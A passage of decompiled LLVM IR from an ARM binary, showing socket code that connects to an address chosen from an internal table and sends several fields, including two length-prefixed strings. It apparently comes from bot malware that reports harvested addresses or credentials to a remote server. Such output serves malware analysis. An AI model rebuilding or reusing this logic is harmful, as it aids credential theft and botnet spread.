dec_label_pc_12cc0:                               ; preds = %dec_label_pc_12cb4
  %v1_12cc0 = add i32 %v0_12cb4, -1
  %v2_12cc0 = inttoptr i32 %v1_12cc0 to i8*
  %v3_12cc0 = load i8, i8* %v2_12cc0, align 1
  %v4_12cc0 = zext i8 %v3_12cc0 to i32
  store i32 %v4_12cc0, i32* %r3.global-to-local, align 4
  %v2_12cc4 = icmp ugt i8 %v3_12cc0, -4
  store i1 %v2_12cc4, i1* %cpsr_c.global-to-local, align 1
  %v7_12cc4 = icmp eq i8 %v3_12cc0, -3
  store i1 %v7_12cc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12cc4, label %bb350, label %dec_label_pc_12cd0

bb350:                                            ; preds = %dec_label_pc_12cc0
  %v1_12cc8 = load i32, i32* @r8, align 4
  %v2_12cc8 = trunc i32 %v1_12cc8 to i8
  store i8 %v2_12cc8, i8* %v2_12cc0, align 1
  %v0_12ccc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12ccc.pr, label %dec_label_pc_124fc, label %.dec_label_pc_12cd0_crit_edge

.dec_label_pc_12cd0_crit_edge:                    ; preds = %bb350
  %v0_12cd0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12cd0

dec_label_pc_12cd0:                               ; preds = %.dec_label_pc_12cd0_crit_edge, %dec_label_pc_12cc0
  %v0_12cd0 = phi i32 [ %v0_12cd0.pre, %.dec_label_pc_12cd0_crit_edge ], [ %v4_12cc0, %dec_label_pc_12cc0 ]
  %v2_12cd0 = icmp ugt i32 %v0_12cd0, 250
  store i1 %v2_12cd0, i1* %cpsr_c.global-to-local, align 1
  %v7_12cd0 = icmp eq i32 %v0_12cd0, 251
  store i1 %v7_12cd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12cd0, label %bb351, label %dec_label_pc_124fc

bb351:                                            ; preds = %dec_label_pc_12cd0
  %v1_12cd4 = load i32, i32* %sl.global-to-local, align 4
  %v2_12cd4 = trunc i32 %v1_12cd4 to i8
  %v3_12cd4 = load i32, i32* @r4, align 4
  %v4_12cd4 = add i32 %v3_12cd4, -1
  %v5_12cd4 = inttoptr i32 %v4_12cd4 to i8*
  store i8 %v2_12cd4, i8* %v5_12cd4, align 1
  br label %dec_label_pc_124fc

dec_label_pc_12cdc:                               ; preds = %dec_label_pc_12a70
  store i32 %v1_12aac, i32* %r0.global-to-local, align 4
  %v0_12ce4 = load i32, i32* @r5, align 4
  %v1_12ce4 = add i32 %v0_12ce4, 4
  %v2_12ce4 = inttoptr i32 %v1_12ce4 to i32*
  %v3_12ce4 = load i32, i32* %v2_12ce4, align 4
  store i32 %v3_12ce4, i32* %r0.global-to-local, align 4
  %v1_12ce8 = call i32 @close(i32 %v3_12ce4)
  store i32 %v1_12ce8, i32* %r0.global-to-local, align 4
  %v0_12cec = load i32, i32* @r5, align 4
  %v1_12cec = add i32 %v0_12cec, 284
  %v2_12cec = inttoptr i32 %v1_12cec to i8*
  %v3_12cec = load i8, i8* %v2_12cec, align 1
  %v4_12cec = zext i8 %v3_12cec to i32
  %v1_12cf0 = add nuw nsw i32 %v4_12cec, 1
  %v1_12cf4 = urem i32 %v1_12cf0, 256
  store i32 %v1_12cf4, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r4, align 4
  %v2_12cfc = icmp ugt i32 %v1_12cf4, 9
  store i1 %v2_12cfc, i1* %cpsr_c.global-to-local, align 1
  %v7_12cfc = icmp eq i32 %v1_12cf4, 10
  store i1 %v7_12cfc, i1* %cpsr_z.global-to-local, align 1
  %v2_12d00 = add i32 %v0_12cec, 4
  %v3_12d00 = inttoptr i32 %v2_12d00 to i32*
  store i32 -1, i32* %v3_12d00, align 4
  %v0_12d04 = load i32, i32* %r3.global-to-local, align 4
  %v1_12d04 = trunc i32 %v0_12d04 to i8
  %v2_12d04 = load i32, i32* @r5, align 4
  %v3_12d04 = add i32 %v2_12d04, 284
  %v4_12d04 = inttoptr i32 %v3_12d04 to i8*
  store i8 %v1_12d04, i8* %v4_12d04, align 1
  %v0_12d08 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_12d0c = load i32, i32* @r5, align 4
  br i1 %v0_12d08, label %dec_label_pc_12d0c, label %dec_label_pc_12df4

dec_label_pc_12d0c:                               ; preds = %dec_label_pc_12cdc
  %v1_12d0c = add i32 %v0_12d0c, 24
  %v2_12d0c = inttoptr i32 %v1_12d0c to i32*
  %v3_12d0c = load i32, i32* %v2_12d0c, align 4
  store i32 %v3_12d0c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @r7, align 4
  %v3_12d1c = add i32 %v0_12d0c, 284
  %v4_12d1c = inttoptr i32 %v3_12d1c to i8*
  store i8 0, i8* %v4_12d1c, align 1
  %v0_12d20 = load i32, i32* %r1.global-to-local, align 4
  %v1_12d20 = load i32, i32* @r5, align 4
  %v2_12d20 = add i32 %v1_12d20, 12
  %v3_12d20 = inttoptr i32 %v2_12d20 to i32*
  store i32 %v0_12d20, i32* %v3_12d20, align 4
  br label %dec_label_pc_12ba4

dec_label_pc_12d28:                               ; preds = %dec_label_pc_123f0
  br i1 %v2_12418, label %dec_label_pc_12e48, label %dec_label_pc_12d2c

dec_label_pc_12d2c:                               ; preds = %dec_label_pc_12d28
  %v3_12d2c = icmp eq i32 %v4_12414, -1
  store i1 %v3_12d2c, i1* %cpsr_c.global-to-local, align 1
  %v8_12d2c = icmp eq i32 %v4_12414, -1
  store i1 %v8_12d2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12d2c, label %dec_label_pc_12d34, label %dec_label_pc_12440

dec_label_pc_12d34:                               ; preds = %dec_label_pc_12d2c
  store i32 %v2_11ed0, i32* %r2.global-to-local, align 4
  %v2_12d38 = load i32, i32* %v0_11ed0, align 4
  store i32 %v2_12d38, i32* %r3.global-to-local, align 4
  %v2_12d3c = icmp ugt i32 %v2_12d38, 10
  store i1 %v2_12d3c, i1* %cpsr_c.global-to-local, align 1
  %v7_12d3c = icmp eq i32 %v2_12d38, 11
  store i1 %v7_12d3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12d3c, label %dec_label_pc_12270, label %dec_label_pc_12d44

dec_label_pc_12d44:                               ; preds = %dec_label_pc_12d34, %dec_label_pc_12e48
  %v0_12d44 = load i32, i32* @r5, align 4
  %v1_12d44 = add i32 %v0_12d44, 4
  %v2_12d44 = inttoptr i32 %v1_12d44 to i32*
  %v3_12d44 = load i32, i32* %v2_12d44, align 4
  store i32 %v3_12d44, i32* %r0.global-to-local, align 4
  %v1_12d48 = call i32 @close(i32 %v3_12d44)
  store i32 %v1_12d48, i32* %r0.global-to-local, align 4
  %v0_12d4c = load i32, i32* @r5, align 4
  %v1_12d4c = add i32 %v0_12d4c, 284
  %v2_12d4c = inttoptr i32 %v1_12d4c to i8*
  %v3_12d4c = load i8, i8* %v2_12d4c, align 1
  %v4_12d4c = zext i8 %v3_12d4c to i32
  %v1_12d50 = add nuw nsw i32 %v4_12d4c, 1
  %v1_12d54 = urem i32 %v1_12d50, 256
  store i32 %v1_12d54, i32* %r3.global-to-local, align 4
  %v2_12d58 = icmp ugt i32 %v1_12d54, 8
  store i1 %v2_12d58, i1* %cpsr_c.global-to-local, align 1
  %v7_12d58 = icmp eq i32 %v1_12d54, 9
  store i1 %v7_12d58, i1* %cpsr_z.global-to-local, align 1
  %v1_12d5c = trunc i32 %v1_12d50 to i8
  store i8 %v1_12d5c, i8* %v2_12d4c, align 1
  store i32 -1, i32* @r4, align 4
  %v0_12d64 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_12d64 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_12d64 = xor i1 %v1_12d64, true
  %v3_12d64 = and i1 %v0_12d64, %v2_12d64
  br i1 %v3_12d64, label %bb352, label %.thread218

.thread218:                                       ; preds = %dec_label_pc_12d44
  %v1_12d68214219 = load i32, i32* @r5, align 4
  %v2_12d68215220 = add i32 %v1_12d68214219, 4
  %v3_12d68216221 = inttoptr i32 %v2_12d68215220 to i32*
  store i32 -1, i32* %v3_12d68216221, align 4
  br label %bb353

bb352:                                            ; preds = %dec_label_pc_12d44
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12d68210 = load i32, i32* @r5, align 4
  %v2_12d68211 = add i32 %v1_12d68210, 4
  %v3_12d68212 = inttoptr i32 %v2_12d68211 to i32*
  store i32 -1, i32* %v3_12d68212, align 4
  %v4_12d6c = load i32, i32* %r3.global-to-local, align 4
  %v5_12d6c = load i32, i32* @r5, align 4
  %v6_12d6c = add i32 %v5_12d6c, 12
  %v7_12d6c = inttoptr i32 %v6_12d6c to i32*
  store i32 %v4_12d6c, i32* %v7_12d6c, align 4
  %v4_12d70 = load i32, i32* %r3.global-to-local, align 4
  %v5_12d70 = trunc i32 %v4_12d70 to i8
  %v6_12d70 = load i32, i32* @r5, align 4
  %v7_12d70 = add i32 %v6_12d70, 284
  %v8_12d70 = inttoptr i32 %v7_12d70 to i8*
  store i8 %v5_12d70, i8* %v8_12d70, align 1
  %v0_12d74.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_12d74.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb353

bb353:                                            ; preds = %.thread218, %bb352
  %v1_12d74 = phi i1 [ %v1_12d74.pre, %bb352 ], [ %v1_12d64, %.thread218 ]
  %v0_12d74 = phi i1 [ %v0_12d74.pre, %bb352 ], [ %v0_12d64, %.thread218 ]
  %v2_12d74 = xor i1 %v1_12d74, true
  %v3_12d74 = and i1 %v0_12d74, %v2_12d74
  br i1 %v3_12d74, label %dec_label_pc_12270, label %dec_label_pc_12d78

dec_label_pc_12d78:                               ; preds = %bb353
  %v0_12d78 = load i32, i32* @r5, align 4
  store i32 %v0_12d78, i32* @r0, align 4
  %v0_12d7c = call i32 @function_113ac()
  store i32 %v0_12d7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12270

dec_label_pc_12d84:                               ; preds = %dec_label_pc_12734, %dec_label_pc_12710, %dec_label_pc_12750
  store i32 %v3_12710, i32* %r1.global-to-local, align 4
  %v0_12d88 = load i32, i32* @sb, align 4
  store i32 %v0_12d88, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1453c.388 to i32), i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v5_12d94 = call i32 @function_13a60(i32 %v0_12d88, i32 %v3_12710, i32 ptrtoint ([8 x i8]* @global_var_1453c.388 to i32), i32 7)
  store i32 %v5_12d94, i32* %r0.global-to-local, align 4
  %v3_12d98 = icmp eq i32 %v5_12d94, -1
  store i1 %v3_12d98, i1* %cpsr_c.global-to-local, align 1
  %v8_12d98 = icmp eq i32 %v5_12d94, -1
  store i1 %v8_12d98, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_12d94, i32* @r7, align 4
  br i1 %v3_12d98, label %dec_label_pc_123d4.loopexit, label %dec_label_pc_1275c

dec_label_pc_12da8:                               ; preds = %dec_label_pc_12cb4
  store i32 %v2_124a0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_12db4 = add i32 %v0_12ca0, 4
  %v2_12db4 = inttoptr i32 %v1_12db4 to i32*
  %v3_12db4 = load i32, i32* %v2_12db4, align 4
  store i32 %v3_12db4, i32* %r0.global-to-local, align 4
  %v5_12db8 = call i32 @send(i32 %v3_12db4, i32* nonnull %stack_var_-41, i32 3, i32 16384)
  store i32 %v5_12db8, i32* %r0.global-to-local, align 4
  store i32 %v2_12c8c, i32* %r1.global-to-local, align 4
  %v0_12dc0 = load i32, i32* @r5, align 4
  %v1_12dc0 = add i32 %v0_12dc0, 4
  %v2_12dc0 = inttoptr i32 %v1_12dc0 to i32*
  %v3_12dc0 = load i32, i32* %v2_12dc0, align 4
  store i32 %v3_12dc0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12538

dec_label_pc_12dd0:                               ; preds = %dec_label_pc_123e0
  store i32 %.pre, i32* %r0.global-to-local, align 4
  %v1_12dd8 = add i32 %v0_12dd0, 92
  store i32 %v1_12dd8, i32* %r1.global-to-local, align 4
  store i32 192, i32* %r2.global-to-local, align 4
  %v3_12de0 = call i32 @_memmove(i32 %.pre, i32 %v1_12dd8, i32 192)
  store i32 %v3_12de0, i32* %r0.global-to-local, align 4
  %v0_12de4 = load i32, i32* @r5, align 4
  %v1_12de4 = add i32 %v0_12de4, 24
  %v2_12de4 = inttoptr i32 %v1_12de4 to i32*
  %v3_12de4 = load i32, i32* %v2_12de4, align 4
  store i32 %v3_12de4, i32* %r3.global-to-local, align 4
  %v1_12de8 = add i32 %v3_12de4, -64
  store i32 %v1_12de8, i32* %ip.global-to-local, align 4
  store i32 %v1_12de8, i32* %v2_12de4, align 4
  br label %dec_label_pc_123f0

dec_label_pc_12df4:                               ; preds = %dec_label_pc_12cdc
  store i32 %v0_12d0c, i32* @r0, align 4
  %v0_12df8 = call i32 @function_113ac()
  store i32 %v0_12df8, i32* %r0.global-to-local, align 4
  %v0_12dfc = load i32, i32* @r5, align 4
  %v1_12dfc = add i32 %v0_12dfc, 24
  %v2_12dfc = inttoptr i32 %v1_12dfc to i32*
  %v3_12dfc = load i32, i32* %v2_12dfc, align 4
  store i32 %v3_12dfc, i32* %ip.global-to-local, align 4
  %v0_12e00 = load i32, i32* @r4, align 4
  store i32 %v0_12e00, i32* @r7, align 4
  br label %dec_label_pc_12ba4

dec_label_pc_12e08:                               ; preds = %dec_label_pc_121c8, %dec_label_pc_121ac
  %v0_12e08 = load i32, i32* @r7, align 4
  %v1_12e08 = load i32, i32* @r4, align 4
  %v2_12e08 = add i32 %v1_12e08, 12
  %v3_12e08 = inttoptr i32 %v2_12e08 to i32*
  store i32 %v0_12e08, i32* %v3_12e08, align 4
  %v0_12e0c = load i32, i32* @r7, align 4
  %v1_12e0c = trunc i32 %v0_12e0c to i8
  %v2_12e0c = load i32, i32* @r4, align 4
  %v3_12e0c = add i32 %v2_12e0c, 284
  %v4_12e0c = inttoptr i32 %v3_12e0c to i8*
  store i8 %v1_12e0c, i8* %v4_12e0c, align 1
  br label %bb311

dec_label_pc_12e14:                               ; preds = %dec_label_pc_12354, %dec_label_pc_1230c
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12e18

dec_label_pc_12e18:                               ; preds = %dec_label_pc_1237c, %dec_label_pc_12e14
  %v0_12e20 = phi i32 [ 0, %dec_label_pc_12e14 ], [ %v0_1235c, %dec_label_pc_1237c ]
  %v0_12e18 = load i32, i32* @r5, align 4
  %v1_12e18 = add i32 %v0_12e18, 4
  %v2_12e18 = inttoptr i32 %v1_12e18 to i32*
  %v3_12e18 = load i32, i32* %v2_12e18, align 4
  store i32 %v3_12e18, i32* %r4.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_12e20 = inttoptr i32 %v0_12e18 to i32*
  store i32 %v0_12e20, i32* %v2_12e20, align 4
  %v0_12e24 = load i32, i32* %ip.global-to-local, align 4
  %v1_12e24 = load i32, i32* @r5, align 4
  %v2_12e24 = add i32 %v1_12e24, 24
  %v3_12e24 = inttoptr i32 %v2_12e24 to i32*
  store i32 %v0_12e24, i32* %v3_12e24, align 4
  %v0_1224c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1224c

dec_label_pc_12e2c:                               ; preds = %dec_label_pc_122cc
  %v0_12e2c = load i32, i32* @r5, align 4
  %v1_12e2c = add i32 %v0_12e2c, 4
  %v2_12e2c = inttoptr i32 %v1_12e2c to i32*
  %v3_12e2c = load i32, i32* %v2_12e2c, align 4
  store i32 %v3_12e2c, i32* %r0.global-to-local, align 4
  %v1_12e30 = call i32 @close(i32 %v3_12e2c)
  store i32 %v1_12e30, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v0_12e38 = load i32, i32* @r6, align 4
  %v1_12e38 = load i32, i32* @r5, align 4
  %v2_12e38 = add i32 %v1_12e38, 12
  %v3_12e38 = inttoptr i32 %v2_12e38 to i32*
  store i32 %v0_12e38, i32* %v3_12e38, align 4
  %v0_12e3c = load i32, i32* %r4.global-to-local, align 4
  %v1_12e3c = load i32, i32* @r5, align 4
  %v2_12e3c = add i32 %v1_12e3c, 4
  %v3_12e3c = inttoptr i32 %v2_12e3c to i32*
  store i32 %v0_12e3c, i32* %v3_12e3c, align 4
  %v0_12e40 = load i32, i32* @r6, align 4
  %v1_12e40 = trunc i32 %v0_12e40 to i8
  %v2_12e40 = load i32, i32* @r5, align 4
  %v3_12e40 = add i32 %v2_12e40, 284
  %v4_12e40 = inttoptr i32 %v3_12e40 to i8*
  store i8 %v1_12e40, i8* %v4_12e40, align 1
  br label %dec_label_pc_12270

dec_label_pc_12e48:                               ; preds = %dec_label_pc_12d28
  store i32 %v2_11ed0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 104, i32* %v0_11ed0, align 4
  br label %dec_label_pc_12d44

dec_label_pc_12e58:                               ; preds = %dec_label_pc_12b60
  store i32 2, i32* @r5, align 4
  %v1_12e5c = add i32 %v2_12b7c, 4
  %v2_12e5c = inttoptr i32 %v1_12e5c to i32*
  %v3_12e5c = load i32, i32* %v2_12e5c, align 4
  store i32 %v3_12e5c, i32* @r4, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v0_12e68 = call i32 @function_10b68()
  store i32 %v0_12e68, i32* %r0.global-to-local, align 4
  %v0_12e6c = load i32, i32* @r8, align 4
  %v1_12e6c = inttoptr i32 %v0_12e6c to i8*
  %v2_12e6c = load i8, i8* %v1_12e6c, align 1
  %v3_12e6c = zext i8 %v2_12e6c to i32
  store i32 %v3_12e6c, i32* %r1.global-to-local, align 4
  %v2_12e70 = urem i32 %v0_12e68, %v3_12e6c
  store i32 %v2_12e70, i32* %r0.global-to-local, align 4
  %v0_12e74 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_12e74 = mul nuw nsw i32 %v2_12e70, 4
  %v5_12e74 = add i32 %v0_12e74, %v4_12e74
  %v6_12e74 = inttoptr i32 %v5_12e74 to i32*
  %v7_12e74 = load i32, i32* %v6_12e74, align 4
  store i32 %v7_12e74, i32* %r3.global-to-local, align 4
  %v0_12e78 = load i32, i32* @sl, align 4
  store i32 %v0_12e78, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r0.global-to-local, align 4
  %v2_12e84 = inttoptr i32 %v0_12e78 to i32*
  %v3_12e84 = call i32 @function_12f90(i32 19, i32* %v2_12e84)
  %v4_12e84 = inttoptr i32 %v3_12e84 to i8*
  store i32 %v3_12e84, i32* %r0.global-to-local, align 4
  %v2_12e88 = add i32 %v3_12e84, 1
  %v3_12e88 = inttoptr i32 %v2_12e88 to i8*
  %v4_12e88 = load i8, i8* %v3_12e88, align 1
  %v5_12e88 = zext i8 %v4_12e88 to i32
  store i32 %v5_12e88, i32* %r2.global-to-local, align 4
  %v3_12e8c = load i8, i8* %v4_12e84, align 1
  %v4_12e8c = zext i8 %v3_12e8c to i32
  %v4_12e90 = mul nuw nsw i32 %v5_12e88, 256
  %v5_12e90 = or i32 %v4_12e8c, %v4_12e90
  store i32 %v5_12e90, i32* %r3.global-to-local, align 4
  %v1_12e94 = and i32 %v4_12e8c, 128
  %v2_12e94 = icmp ne i32 %v1_12e94, 0
  store i1 %v2_12e94, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_12e88, i32* %r1.global-to-local, align 4
  %v0_12e98 = load i32, i32* @r8, align 4
  store i32 %v0_12e98, i32* %r0.global-to-local, align 4
  %v2_12ea4 = sext i8 %v4_12e88 to i32
  %v7_12ea4 = inttoptr i32 %v0_12e98 to i32*
  %v8_12ea4 = call i32 @function_10e28(i32* %v7_12ea4, i32 %v2_12ea4)
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_12eac = call i32 @function_12fbc(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_12eb4 = call i32 @function_12fbc(i32 19)
  %v0_12ebc = load i32, i32* @r6, align 4
  store i32 %v0_12ebc, i32* %r0.global-to-local, align 4
  store i32 %v2_11ea0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_12ec8 = call i32 @_connect(i32 %v0_12ebc, i32 %v2_11ea0, i32 16)
  store i32 %v3_12ec8, i32* %r0.global-to-local, align 4
  %v3_12ecc = icmp eq i32 %v3_12ec8, -1
  store i1 %v3_12ecc, i1* %cpsr_c.global-to-local, align 1
  %v8_12ecc = icmp eq i32 %v3_12ec8, -1
  store i1 %v8_12ecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12ecc, label %dec_label_pc_12ed4, label %dec_label_pc_12ee4

dec_label_pc_12ed4:                               ; preds = %dec_label_pc_12e58
  %v0_12ed4 = load i32, i32* @r6, align 4
  store i32 %v0_12ed4, i32* %r0.global-to-local, align 4
  %v1_12ed8 = call i32 @close(i32 %v0_12ed4)
  %v0_12edc = load i32, i32* @sl, align 4
  store i32 %v0_12edc, i32* %r0.global-to-local, align 4
  call void @exit(i32 %v0_12edc)
  unreachable

dec_label_pc_12ee4:                               ; preds = %dec_label_pc_12e58
  store i32 %v2_12808, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12ef4 = load i32, i32* @r6, align 4
  store i32 %v0_12ef4, i32* %r0.global-to-local, align 4
  %v0_12ef8 = load i32, i32* @sl, align 4
  store i32 %v0_12ef8, i32* %stack_var_-56, align 4
  %v6_12efc = call i32 @send(i32 %v0_12ef4, i32* nonnull %stack_var_-56, i32 1, i32 16384)
  store i32 %v2_128bc, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12f10 = load i32, i32* @r6, align 4
  store i32 %v0_12f10, i32* %r0.global-to-local, align 4
  %v5_12f14 = call i32 @send(i32 %v0_12f10, i32* nonnull %stack_var_-48, i32 4, i32 16384)
  %v0_12f1c = load i32, i32* @r5, align 4
  store i32 %v0_12f1c, i32* %r2.global-to-local, align 4
  %v2_12f20 = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_12f20, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12f28 = load i32, i32* @r6, align 4
  store i32 %v0_12f28, i32* %r0.global-to-local, align 4
  %v5_12f2c = call i32 @send(i32 %v0_12f28, i32* nonnull %stack_var_-38, i32 %v0_12f1c, i32 16384)
  %v0_12f30 = load i32, i32* @fp, align 4
  %v1_12f30 = add i32 %v0_12f30, 12
  store i32 %v1_12f30, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12f3c = load i32, i32* @r6, align 4
  store i32 %v0_12f3c, i32* %r0.global-to-local, align 4
  %v4_12f40 = inttoptr i32 %v1_12f30 to i32*
  %v5_12f40 = call i32 @send(i32 %v0_12f3c, i32* %v4_12f40, i32 1, i32 16384)
  store i32 %v5_12f40, i32* %r0.global-to-local, align 4
  %v0_12f44 = load i32, i32* @fp, align 4
  %v1_12f44 = inttoptr i32 %v0_12f44 to i32*
  %v2_12f44 = load i32, i32* %v1_12f44, align 4
  store i32 %v2_12f44, i32* %r1.global-to-local, align 4
  %v1_12f48 = add i32 %v0_12f44, 12
  %v2_12f48 = inttoptr i32 %v1_12f48 to i8*
  %v3_12f48 = load i8, i8* %v2_12f48, align 1
  %v4_12f48 = zext i8 %v3_12f48 to i32
  store i32 %v4_12f48, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12f50 = load i32, i32* @r6, align 4
  store i32 %v0_12f50, i32* %r0.global-to-local, align 4
  %v4_12f54 = inttoptr i32 %v2_12f44 to i32*
  %v5_12f54 = call i32 @send(i32 %v0_12f50, i32* %v4_12f54, i32 %v4_12f48, i32 16384)
  %v0_12f58 = load i32, i32* @fp, align 4
  %v1_12f58 = add i32 %v0_12f58, 13
  store i32 %v1_12f58, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12f64 = load i32, i32* @r6, align 4
  store i32 %v0_12f64, i32* %r0.global-to-local, align 4
  %v4_12f68 = inttoptr i32 %v1_12f58 to i32*
  %v5_12f68 = call i32 @send(i32 %v0_12f64, i32* %v4_12f68, i32 1, i32 16384)
  %v0_12f6c = load i32, i32* @r6, align 4
  store i32 %v0_12f6c, i32* %r0.global-to-local, align 4
  %v0_12f70 = load i32, i32* @fp, align 4
  %v1_12f70 = add i32 %v0_12f70, 13
  %v2_12f70 = inttoptr i32 %v1_12f70 to i8*
  %v3_12f70 = load i8, i8* %v2_12f70, align 1
  %v4_12f70 = zext i8 %v3_12f70 to i32
  store i32 %v4_12f70, i32* %r2.global-to-local, align 4
  %v1_12f74 = add i32 %v0_12f70, 4
  %v2_12f74 = inttoptr i32 %v1_12f74 to i32*
  %v3_12f74 = load i32, i32* %v2_12f74, align 4
  store i32 %v3_12f74, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_12f7c = inttoptr i32 %v3_12f74 to i32*
  %v5_12f7c = call i32 @send(i32 %v0_12f6c, i32* %v4_12f7c, i32 %v4_12f70, i32 16384)
  %v0_12f80 = load i32, i32* @r6, align 4
  store i32 %v0_12f80, i32* %r0.global-to-local, align 4
  %v1_12f84 = call i32 @close(i32 %v0_12f80)
  store i32 %v1_12f84, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f88

dec_label_pc_12f88:                               ; preds = %dec_label_pc_12b44, %dec_label_pc_12ee4
  %v0_12f88 = load i32, i32* @sl, align 4
  store i32 %v0_12f88, i32* %r0.global-to-local, align 4
  call void @exit(i32 %v0_12f88)
  unreachable

; uselistorder directives
  uselistorder i32 %v4_12e8c, { 1, 0 }
  uselistorder i32 %v5_12e88, { 1, 0, 2 }
  uselistorder i32 %v5_12d94, { 2, 0, 3, 4, 1 }
  uselistorder i1 %v1_12d64, { 1, 0 }
  uselistorder i32 %v1_12d54, { 2, 1, 0 }
  uselistorder i32 %v1_12d50, { 1, 0 }
  uselistorder i32 %v0_12d0c, { 1, 0, 2 }
  uselistorder i32 %v1_12cf4, { 2, 1, 0 }
  uselistorder i32 %v0_12ca0, { 1, 2, 0 }
  uselistorder i1 %v7_12c14, { 1, 0 }
  uselistorder i32 %v1_12c10, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_12c08, { 1, 0 }
  uselistorder i8 %v3_12c00, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12c10, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_12bec, { 1, 0 }
  uselistorder i1 %v7_12be4, { 1, 0 }
  uselistorder i1 %v7_12bdc, { 1, 0 }
  uselistorder i32 %v0_12bb8, { 1, 2, 0 }
  uselistorder i32 %v2_12ba4, { 1, 0 }
  uselistorder i32 %v1_12ba4, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_12ba4, { 3, 2, 5, 0, 1, 4, 6 }
  uselistorder i1 %v7_12b54, { 1, 0 }
  uselistorder i32 %v3_12b50, { 1, 0, 2, 3 }
  uselistorder i1 %v2_12b3c, { 1, 0 }
  uselistorder i32 %.357, { 1, 0 }
  uselistorder i1 %v7_12b24, { 1, 0 }
  uselistorder i32 %v0_12b20, { 2, 1, 0, 3 }
  uselistorder i32 %v4_12b00, { 1, 0, 2 }
  uselistorder i32 %v4_12afc, { 1, 0, 2 }
  uselistorder i1 %v7_12aec, { 1, 0 }
  uselistorder i32 %v0_12aec, { 3, 2, 0, 4, 1 }
  uselistorder i1 %v7_12a08, { 1, 0 }
  uselistorder i32 %v1_12a04, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_129fc, { 1, 0 }
  uselistorder i8 %v3_129f4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12a04, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_129e0, { 1, 0 }
  uselistorder i1 %v7_129d8, { 1, 0 }
  uselistorder i1 %v7_129d0, { 1, 0 }
  uselistorder i1 %v7_12954, { 1, 0 }
  uselistorder i32 %v1_12950, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_12948, { 1, 0 }
  uselistorder i8 %v3_12940, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12950, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_1292c, { 1, 0 }
  uselistorder i1 %v7_12924, { 1, 0 }
  uselistorder i1 %v7_1291c, { 1, 0 }
  uselistorder i1 %v7_128a0, { 1, 0 }
  uselistorder i32 %v1_1289c, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_12894, { 1, 0 }
  uselistorder i8 %v3_1288c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1289c, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_12878, { 1, 0 }
  uselistorder i1 %v7_12870, { 1, 0 }
  uselistorder i1 %v7_12868, { 1, 0 }
  uselistorder i1 %v7_127ec, { 1, 0 }
  uselistorder i32 %v1_127e8, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_127e0, { 1, 0 }
